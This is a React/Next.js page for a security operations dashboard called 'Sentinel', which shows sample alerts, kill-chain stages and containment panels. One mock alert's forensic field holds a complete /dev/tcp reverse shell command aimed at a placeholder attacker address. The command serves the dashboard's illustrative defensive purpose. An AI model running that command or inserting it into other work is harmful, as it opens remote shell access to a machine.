"use client";

import React, { useState } from "react";
import Link from "next/link";
import { ArrowUpRight, Shield, Radio, Lock, Terminal, Activity, Zap } from "lucide-react";

import { BrutalistHeader } from "@/components/BrutalistHeader";
import { HolographicMatrix } from "@/components/HolographicMatrix";
import { MetricCards } from "@/components/MetricCards";
import { CoreEnginesGrid } from "@/components/CoreEnginesGrid";
import { KillChainGraph } from "@/components/KillChainGraph";
import { LiveAlertFeed, AlertItem } from "@/components/LiveAlertFeed";
import { ContainmentPanel } from "@/components/ContainmentPanel";
import { SystemTelemetryGauges } from "@/components/SystemTelemetryGauges";
import { GlobalSensorMap } from "@/components/GlobalSensorMap";
import { HazardFooter } from "@/components/HazardFooter";
import { AttackSimulationModal } from "@/components/AttackSimulationModal";

export default function SOCDashboard() {
  const [isSimModalOpen, setIsSimModalOpen] = useState(false);

  const initialAlerts: AlertItem[] = [
    {
      alert_id: "alert-01",
      timestamp: new Date().toISOString(),
      title: "CRITICAL: Multi-Stage Attack Chain Detected on 192.168.1.100",
      severity: "CRITICAL",
      source_ip: "198.51.100.44",
      destination_ip: "192.168.1.100",
      mitre_technique: "ATTACK-CHAIN-DETECTED",
      attack_chain_stage: "CRITICAL-ROOT",
      description: "Sequential progression observed: RECON -> EXPLOITATION -> EXECUTION -> C2 within 60s sliding window.",
      forensic_payload: '{"target": "192.168.1.100", "attacker": "198.51.100.44", "stages": ["RECON", "EXPLOITATION", "EXECUTION", "C2"], "action": "ISOLATE_HOST"}',
    },
    {
      alert_id: "alert-02",
      timestamp: new Date(Date.now() - 14000).toISOString(),
      title: "Covert C2 Beaconing Detected (192.168.1.100 -> 198.51.100.44)",
      severity: "CRITICAL",
      source_ip: "192.168.1.100",
      destination_ip: "198.51.100.44",
      mitre_technique: "T1071.001",
      attack_chain_stage: "C2",
      description: "Low-jitter periodic beaconing verified via Isolation Forest. Interval: 1.50s, Jitter: 0.042.",
      forensic_payload: '{"flow": "192.168.1.100 -> 198.51.100.44:443", "mean_iat": 1.50, "jitter": 0.042, "threat_intel": "MATCH_COBALT_STRIKE"}',
    },
    {
      alert_id: "alert-03",
      timestamp: new Date(Date.now() - 31000).toISOString(),
      title: "Malicious Process Execution: Reverse Shell Spawning via /dev/tcp",
      severity: "HIGH",
      source_ip: "192.168.1.100",
      destination_ip: "198.51.100.44",
      mitre_technique: "T1059.004",
      attack_chain_stage: "EXECUTION",
      description: "Kernel eBPF tracepoint sys_enter_execve caught /bin/sh spawning redirected socket to external C2.",
      forensic_payload: '{"pid": 9482, "ppid": 1204, "cmdline": "/bin/sh -i >& /dev/tcp/198.51.100.44/4444 0>&1", "uid": 0}',
    },
  ];

  return (
    <div className="min-h-screen bg-[#050505] text-gray-100 flex flex-col font-mono selection:bg-acid-lime selection:text-black">
      {/* Top Brutalist Nav */}
      <BrutalistHeader onOpenSimulation={() => setIsSimModalOpen(true)} />

      {/* Main Container */}
      <main className="max-w-7xl mx-auto px-4 md:px-8 py-8 w-full space-y-12">
        {/* /01 HERO SECTION: CYBER BRUTALISM */}
        <section className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-stretch pt-4">
          {/* Left Hero Content */}
          <div className="lg:col-span-7 flex flex-col justify-between relative">
            <div>
              {/* Top Rail Subhead */}
              <div className="flex items-center space-x-3 text-xs text-muted-gray mb-4">
                <span className="text-acid-lime font-bold">2026</span>
                <span>//</span>
                <span>AUTONOMOUS CYBER DEFENSE MATRIX</span>
                <span>//</span>
                <span className="text-alert-red font-bold">DEFCON 2</span>
              </div>

              {/* Stencil Giant Title */}
              <div className="relative">
                <h1 className="text-5xl sm:text-7xl font-display font-black tracking-tighter uppercase text-white leading-none">
                  CYBER
                </h1>
                <div className="flex items-baseline space-x-3">
                  <h1 className="text-5xl sm:text-7xl font-display font-black tracking-tighter uppercase text-white leading-none">
                    BRUTALISM
                  </h1>
                  <span className="text-2xl sm:text-3xl font-mono text-acid-lime font-bold">
                    /01
                  </span>
                </div>
              </div>

              {/* Tagline */}
              <div className="mt-6 mb-4">
                <h2 className="text-sm sm:text-base font-display font-bold uppercase tracking-wider text-acid-lime">
                  THE FUTURE ISN'T MINIMAL. IT'S SYSTEMATIC.
                </h2>
                <p className="text-xs sm:text-sm text-gray-400 mt-2 leading-relaxed max-w-xl">
                  Sentinel is raw, digital, and unapologetically autonomous. A continuous real-time telemetry inspection, graph correlation, and automated containment matrix designed for the machine age.
                </p>
              </div>
            </div>

            {/* Hero Action Buttons */}
            <div className="flex flex-wrap items-center gap-4 pt-6">
              <button
                onClick={() => setIsSimModalOpen(true)}
                className="bg-acid-lime text-black hover:bg-white transition px-6 py-3 font-display font-black text-xs uppercase tracking-wider flex items-center space-x-2 shadow-acid-block active:translate-x-0.5 active:translate-y-0.5"
              >
                <span>EXPLORE ATTACK MATRIX</span>
                <ArrowUpRight size={18} className="stroke-[3]" />
              </button>

              <Link
                href="/timeline"
                className="border border-cyber-border hover:border-acid-lime bg-[#0a0c10] text-gray-300 hover:text-white transition px-5 py-3 font-mono text-xs uppercase tracking-wider flex items-center space-x-2"
              >
                <span>VIEW KILL-CHAIN</span>
                <span className="text-acid-lime">[ ]</span>
              </Link>
            </div>
          </div>

          {/* Right Holographic 3D Wireframe Canvas */}
          <div className="lg:col-span-5">
            <HolographicMatrix />
          </div>
        </section>

        {/* METRICS ROW */}
        <section>
          <MetricCards
            activeAlerts={3}
            criticalChains={1}
            eventsProcessed={14298}
            quarantinedHosts={1}
          />
        </section>

        {/* /02 CORE DETECTION ENGINES */}
        <section>
          <CoreEnginesGrid />
        </section>

        {/* /03 MULTI-STAGE KILL-CHAIN PROGRESSION */}
        <section>
          <KillChainGraph activeStages={["RECON", "EXPLOITATION", "EXECUTION", "C2"]} />
        </section>

        {/* /03 LIVE INGESTION STREAM & TRIAGE */}
        <section className="grid grid-cols-1 gap-6">
          <LiveAlertFeed initialAlerts={initialAlerts} />
        </section>

        {/* /04 SOAR CONTAINMENT & /05 SYSTEM STATUS (SIDE-BY-SIDE) */}
        <section className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          <ContainmentPanel />
          <SystemTelemetryGauges />
        </section>

        {/* /06 GLOBAL SENSOR NODES & RADAR */}
        <section>
          <GlobalSensorMap />
        </section>
      </main>

      {/* Diagonal Hazard Footer Banner */}
      <HazardFooter />

      {/* Cyber Range Simulation Modal */}
      <AttackSimulationModal
        isOpen={isSimModalOpen}
        onClose={() => setIsSimModalOpen(false)}
      />
    </div>
  );
}
